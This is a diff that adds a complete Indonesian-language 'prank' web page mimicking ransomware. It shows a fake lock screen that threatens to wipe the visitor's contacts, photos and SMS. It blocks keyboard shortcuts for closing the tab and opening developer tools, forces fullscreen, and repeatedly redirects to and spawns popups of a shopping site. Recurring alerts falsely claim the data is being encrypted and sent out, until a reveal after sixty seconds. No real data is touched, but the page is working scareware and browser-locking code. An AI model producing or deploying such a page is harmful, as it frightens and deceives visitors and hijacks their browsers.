@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>⚠️ SYSTEM LOCKED ⚠️</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+        body {
+            background: #000;
+            overflow: hidden;
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+        }
+        /* Modal password */
+        .password-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 100000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(10px);
+        }
+        .modal-content {
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            border: 2px solid red;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 0 50px rgba(255,0,0,0.3);
+        }
+        .modal-content h1 {
+            color: red;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        .modal-content p {
+            color: #ccc;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .modal-content input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            background: #333;
+            border: 1px solid red;
+            color: white;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .modal-content button {
+            background: red;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-weight: bold;
+            width: 100%;
+            transition: 0.3s;
+        }
+        .modal-content button:hover {
+            background: darkred;
+        }
+        .error-message {
+            color: red;
+            margin-top: 10px;
+            font-size: 12px;
+        }
+        /* Ad container */
+        .ads-container {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            width: 300px;
+            height: 250px;
+            background: white;
+            border: 2px solid red;
+            z-index: 1000;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        /* Final message container */
+        .final-message {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+            z-index: 200000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-family: 'Comic Neue', 'Comic Sans MS', cursive;
+            flex-direction: column;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.5s ease;
+        }
+        .final-message.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        .final-message h1 {
+            font-size: 48px;
+            color: #ff0066;
+            text-shadow: 3px 3px 0 #ffff00;
+            margin-bottom: 30px;
+            animation: bounce 1s infinite;
+        }
+        .final-message img {
+            width: 300px;
+            height: auto;
+            border-radius: 20px;
+            box-shadow: 0 20px 30px rgba(0,0,0,0.3);
+            margin: 20px;
+            border: 5px solid white;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+    </style>
+</head>
+<body>
+    <div id="passwordModal" class="password-modal">
+        <div class="modal-content">
+            <h1>🔒 DATA LOCKED 🔒</h1>
+            <p>Perangkat Anda telah dikunci oleh sistem keamanan.<br>
+            Semua data (kontak, foto, SMS) akan dihapus permanen jika password salah.</p>
+            <p style="color: yellow;">Masukkan password untuk membuka kunci:</p>
+            <input type="password" id="passwordInput" placeholder="Password" autofocus>
+            <button id="submitBtn">UNLOCK</button>
+            <div id="errorMsg" class="error-message"></div>
+            <p style="font-size: 10px; margin-top: 20px; color: #666;">*Salah 3x akan mengakibatkan data hilang*</p>
+        </div>
+    </div>
+
+    <div class="ads-container">
+        <iframe src="https://shopee.co.id/" frameborder="0"></iframe>
+    </div>
+
+    <!-- Final message container (tersembunyi) -->
+    <div id="finalMessage" class="final-message">
+        <h1>selamat anda kena prank 😋😘🥸☺😤😜</h1>
+        <!-- Ganti nama file foto di bawah dengan file Anda, misal: prank.jpg -->
+        <img id="prankImage" src="prank.jpg" alt="Prank Image">
+        <!-- Ganti nama file audio di bawah dengan file Anda, misal: meme.mp3 -->
+        <audio id="prankAudio" src="meme.mp3" preload="auto"></audio>
+        <p style="margin-top: 20px; font-size: 18px; color: #333;">Terima kasih sudah bersenang-senang! 😂</p>
+    </div>
+
+    <script>
+        // Konfigurasi
+        const PASSWORD = "prank123"; // password yang benar
+        let attemptCount = 0;
+        let isUnlocked = false;
+        let terrorActive = true;
+
+        // ==================== 1. FUNGSI PASSWORD MODAL ====================
+        function showPasswordModal() {
+            document.getElementById('passwordModal').style.display = 'flex';
+        }
+
+        function closePasswordModal() {
+            document.getElementById('passwordModal').style.display = 'none';
+            isUnlocked = true;
+            startTerror();
+        }
+
+        document.getElementById('submitBtn').addEventListener('click', () => {
+            const input = document.getElementById('passwordInput').value;
+            const errorDiv = document.getElementById('errorMsg');
+            if (input === PASSWORD) {
+                closePasswordModal();
+            } else {
+                attemptCount++;
+                if (attemptCount >= 3) {
+                    errorDiv.innerHTML = '⚠️ SALAH 3 KALI! DATA DIHAPUS! (prank) ⚠️';
+                    document.body.style.backgroundColor = 'darkred';
+                    setTimeout(() => {
+                        errorDiv.innerHTML = '';
+                    }, 2000);
+                } else {
+                    errorDiv.innerHTML = `Password salah! Sisa percobaan: ${3 - attemptCount}`;
+                }
+                document.getElementById('passwordInput').value = '';
+                document.getElementById('passwordInput').focus();
+            }
+        });
+
+        document.getElementById('passwordInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                document.getElementById('submitBtn').click();
+            }
+        });
+
+        // ==================== 2. FUNGSI MEMPERSUSAH KELUAR ====================
+        function requestFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) elem.requestFullscreen();
+            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+        }
+        requestFullscreen();
+
+        window.onbeforeunload = function() {
+            if (terrorActive) return "⚠️ PERINGATAN ⚠️\nMenutup tab akan menghapus semua data!";
+        };
+
+        document.addEventListener('keydown', function(e) {
+            if (!terrorActive) return;
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.key === 'u') ||
+                (e.ctrlKey && e.key === 's') ||
+                (e.ctrlKey && e.key === 'w') ||
+                (e.altKey && e.key === 'F4')) {
+                e.preventDefault();
+                e.stopPropagation();
+                alert('❌ Akses diblokir oleh sistem keamanan!');
+                return false;
+            }
+            if (e.ctrlKey && e.key === 'Tab') {
+                e.preventDefault();
+                alert('❌ Tab switching diblokir!');
+            }
+        });
+
+        document.addEventListener('contextmenu', function(e) {
+            if (!terrorActive) return;
+            e.preventDefault();
+            return false;
+        });
+
+        // ==================== 3. REDIRECT OTOMATIS KE SHOPEE ====================
+        let redirectCount = 0;
+        let redirectInterval, popupInterval, alertInterval;
+
+        function aggressiveRedirect() {
+            if (!terrorActive) return;
+            if (redirectCount < 15) {
+                window.location.href = 'https://shopee.co.id/';
+                redirectCount++;
+            } else {
+                const win = window.open('https://shopee.co.id/', '_blank');
+                if (!win) {
+                    alert('⚠️ Buka blokir popup untuk melanjutkan! ⚠️');
+                }
+            }
+        }
+
+        function spawnPopup() {
+            if (!terrorActive) return;
+            const popup = window.open('https://shopee.co.id/', '_blank', 'width=500,height=500');
+            if (popup) {
+                popup.document.write('<h1 style="color:red">⚠️ VIRUS DETEKSI ⚠️</h1><p>Data sedang dikirim...</p>');
+                setTimeout(() => {
+                    if (popup && !popup.closed) popup.close();
+                }, 8000);
+            } else {
+                alert('⚠️ PERINGATAN! AKTIFKAN POPUP UNTUK MENGHINDARI KERUSAKAN DATA ⚠️');
+            }
+        }
+
+        function startTerror() {
+            redirectInterval = setInterval(aggressiveRedirect, 4000);
+            popupInterval = setInterval(spawnPopup, 3000);
+            alertInterval = setInterval(() => {
+                if (terrorActive) alert('⚠️ DATA ANDA SEDANG DIENKRIPSI! JANGAN TUTUP! ⚠️');
+            }, 5000);
+        }
+
+        // ==================== 4. FINALE SETELAH 60 DETIK ====================
+        setTimeout(() => {
+            terrorActive = false;
+            clearInterval(redirectInterval);
+            clearInterval(popupInterval);
+            clearInterval(alertInterval);
+            window.onbeforeunload = null;
+            const ads = document.querySelector('.ads-container');
+            if (ads) ads.style.display = 'none';
+            const modal = document.getElementById('passwordModal');
+            if (modal) modal.style.display = 'none';
+
+            const finalDiv = document.getElementById('finalMessage');
+            finalDiv.classList.add('show');
+            
+            // Putar audio lokal
+            const audio = document.getElementById('prankAudio');
+            audio.play().catch(e => console.log('Autoplay mungkin diblokir, namun karena interaksi sebelumnya sudah ada, seharusnya berjalan.'));
+        }, 60000);
+
+        showPasswordModal();
+    </script>
+</body>
+</html>
